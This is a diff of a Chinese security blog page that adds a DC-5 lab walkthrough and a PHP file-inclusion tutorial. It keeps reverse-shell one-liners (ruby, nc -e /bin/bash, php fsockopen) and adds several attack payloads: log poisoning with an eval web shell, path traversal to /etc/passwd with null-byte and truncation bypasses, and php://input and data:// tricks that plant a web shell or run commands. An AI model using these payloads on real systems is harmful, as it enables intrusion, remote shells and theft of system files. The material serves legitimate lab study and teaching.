@@ -338,7 +338,7 @@
 <p>2.漏洞利用，CVE-2018-7600 Drupal核心远程代码执行漏洞</p>
 <p>3.提权方式，如suid提权</p>
 <p>4.drupal配置文件和重置管理员密码</p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><strong>文件包含漏洞</strong></h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python: python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">nc: nc -e /bin/bash ip port</span><br><span class="line">php:&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">sock=fsockopen(<span class="string">"ip"</span>,port);//自己的外网ip，端口任意</span></span><br><span class="line">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
@@ -400,6 +400,35 @@
 
 
 
+<hr>
+<h2 id="DC-5渗透过程"><a href="#DC-5渗透过程" class="headerlink" title="DC-5渗透过程"></a><strong>DC-5渗透过程</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;# dirb http:&#x2F;&#x2F;192.168.126.155&#x2F; -X .php -S</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;192.168.126.155&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt #默认字典</span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.126.155&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;about-us.php (CODE:200|SIZE:4292)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;contact.php (CODE:200|SIZE:4282)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;faq.php (CODE:200|SIZE:5645)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;footer.php (CODE:200|SIZE:17)  #隐藏路径</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;index.php (CODE:200|SIZE:4025)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;solutions.php (CODE:200|SIZE:4100) </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;thankyou.php (CODE:200|SIZE:852)  #隐藏路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;# dirb http:&#x2F;&#x2F;192.168.126.155&#x2F; -X .php -S</span><br><span class="line"> GET &#x2F;thankyou.php?&lt;?php eval($_REQUEST[666]); ?&gt;  HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -431,7 +460,7 @@
 
 </article>
     
-    <article id="post-oho" class="article article-type-post" itemscope
+    <article id="post-PHP安全" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -439,8 +468,8 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/07/11/oho/"
-    >oho</a
+  <a class="article-title" href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/"
+    >PHP安全</a
   >
 </h2>
   
@@ -450,7 +479,7 @@
 
     
     <div class="article-meta">
-      <a href="/2020/07/11/oho/" class="article-date">
+      <a href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/" class="article-date">
   <time datetime="2020-07-11T06:59:21.000Z" itemprop="datePublished">2020-07-11</time>
 </a>
       
@@ -470,7 +499,104 @@
       
 
       
-      
+      <h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h2><h3 id="1-1-本地文件包含"><a href="#1-1-本地文件包含" class="headerlink" title="1.1 本地文件包含"></a><strong>1.1 本地文件包含</strong></h3><p><strong>../ 表示上一层目录，多../../../ 即可绕过前缀限制</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/desktop/chj# cd /root/tools/../../etc</span><br><span class="line">root@kali:/etc#</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP内核是由C语言实现的，所以0字节(\x00)将作为字符串结束，web输入时转为urlencode变成%00</strong></p>
+<p><strong>即输入?file=../../etc/passwd%00 实际包含文件会变成/etc/passwd</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'/home/run/'</span>.$file.<span class="string">'.php'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/home/run'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>但是通常情况下，网站管理员会禁止0字节，这时候可以利用其它技巧</strong></p>
+<p><strong>原理：目录字符串在windows下256字节、linux下4096字节时会达到最大值，之后的字符将被丢弃</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/././././././././././././abc</span><br><span class="line">/etc/passwd//////////////////abc</span><br><span class="line">/etc/passwd.........................  #点号截断适用于Windows系统</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以通过不同的编码方式来绕过一些服务器端逻辑：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center"></th>
+<th align="left"><strong>url编码</strong></th>
+<th align="left"><strong>二次编码</strong></th>
+<th align="left">web容器编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>../</strong></td>
+<td align="left"><strong>%2e%2e%2f <br>..%2f <br>%2e%2e/</strong></td>
+<td align="left"><strong>%252e%252e%252f</strong></td>
+<td align="left"><strong>..%c0%af</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>..\</strong></td>
+<td align="left"><strong>%2e%2e%5c<br> ..%5c <br>%2e%2e</strong></td>
+<td align="left"><strong>%252e%252e%255c</strong></td>
+<td align="left"><strong>..%c1%9c</strong></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p><strong>防护手段：配置open_basedir、避免包含动态变量，可以枚举出file的值</strong></p>
+<p><strong>例如：open_basedir = /home/app/aaa  那么 /home/app/aaabbb 也是合法的</strong></p>
+<p><strong>如果要限定目录，则设置为open_basedir = /home/app/aaa/ 即可</strong></p>
+<p><strong>如果要配置多个目录的话在windows下用分号，linux下用冒号隔开</strong></p>
+<h3 id="1-2-远程文件包含"><a href="#1-2-远程文件包含" class="headerlink" title="1.2 远程文件包含"></a><strong>1.2 远程文件包含</strong></h3><p><strong>漏洞利用条件：</strong></p>
+<ul>
+<li><strong>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</strong></li>
+<li><strong>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</strong></li>
+</ul>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">     <span class="keyword">include</span>($filename.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 问号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt?</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ＃号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%23(#号要编码)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 空格绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-本地文件包含的利用技巧"><a href="#1-3-本地文件包含的利用技巧" class="headerlink" title="1.3 本地文件包含的利用技巧"></a><strong>1.3 本地文件包含的利用技巧</strong></h3><p><strong>本地文件包含漏洞在某些条件下也可以执行PHP代码，以下是几种常见的技巧：</strong></p>
+<p><strong>（1）包含用户上传的文件</strong></p>
+<p><strong>如果用户上传的文件内容中包含了PHP代码，那么将被include（）加载后执行</strong></p>
+<p><strong>（2）包含data://或php://input 等伪协议</strong></p>
+<p><strong>（3）包含Session文件</strong></p>
+<p><strong>（4）包含日志文件，如web server 的 access log</strong></p>
+<p><strong>（5）包含上传的临时文件（RFC1867)</strong></p>
+<p><strong>（6）包含/proc/self/environ 文件</strong></p>
+<p><strong>（7）包含其它应用创建的文件，如数据库文件、缓存文件、应用日志等</strong></p>
+<p><strong>下面着重分析下其中几种技巧的原理：</strong></p>
+<p><strong>PHP伪协议：</strong></p>
+<p><strong>PHP带了很多内置URL风格的封装协议，可用于fopen、copy、file_exists和filesize等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自定义的封装协议。这些协议都被称为伪协议。</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">php://   访问各个输入/输出流</th>
+<th align="center"><strong>File:// ——访问本地文件系统</strong></th>
+<th align="center"><strong>phar://  PHP归档</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>data://  读取数据(RFC2397)</strong></td>
+<td align="center"><strong>ftp:// ——访问FTP(s)URLs</strong></td>
+<td align="center"><strong>zlib://   压缩流</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>glob://  查找匹配的文件路径模式</strong></td>
+<td align="center"><strong>http:// ——访问HTTP(s)网址</strong></td>
+<td align="center"><strong>expect:// 处理交互式的流</strong></td>
+</tr>
+</tbody></table>
+<h4 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php://filter伪协议"></a><strong>php://filter伪协议</strong></h4><p>php://filter 是元封装器，设计用于数据流打开时的筛选过滤应用,对本地磁盘文件进行读写。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用php:filter读本地磁盘文件时不需要开启allow_url_fopen和allow_url_include</span></span><br><span class="line">(<span class="number">1</span>):filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xx.php</span></span><br><span class="line">(<span class="number">2</span>):filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">  <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=php://filter/read=convert.base64-encode/resource=2.php</span></span><br><span class="line">得到<span class="number">2.</span>php的base64编码</span><br><span class="line">    PD9waHANCiRmaWxlbmFtZT0kX0dFVFsnZmlsZW5hbWUnXTsNCmluY2x1ZGUoJGZpbGVuYW1lKTsNCj8+</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-input伪协议"><a href="#php-input伪协议" class="headerlink" title="php://input伪协议"></a><strong>php://input伪协议</strong></h4><p><strong>php://input可以访问请求的原始数据的只读流，即可以直接读取POST上没有经过解析的原始数据，但是使用enctype=”multipart/form-data”的时候php://input是无效的</strong></p>
+<p><strong>代码例子：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境：需要开启allow_url_include=on</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#写入木马payload如下：</span></span><br><span class="line">URL: http:<span class="comment">//192.168.1.110/test.php?filename=php://input</span></span><br><span class="line">POST:<span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[xiaohua])&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#执行命令POST部分</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看到，成功在本地生成一个shell.php，并写入一句话木马</strong></p>
+<p><strong><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/1.png" alt></strong></p>
+<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a><strong>data://伪协议</strong></h4><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境</span></span><br><span class="line">allow_url_include=on</span><br><span class="line">allow_url_fopen=on </span><br><span class="line"><span class="comment">#data://text/plain;base64,xxxx(base64编码后的数据)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"dir"</span>)<span class="meta">?&gt;</span>编码为PD9waHAgc3lzdGVtKCJkaXIiKT8+</span><br><span class="line">注意这里+需要url编码为%<span class="number">2</span>b才可以运行</span><br></pre></td></tr></table></figure>
+
+<p>成功执行dir命令</p>
+<p><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/2.png" alt></p>
+
       
       <!-- reward -->
       
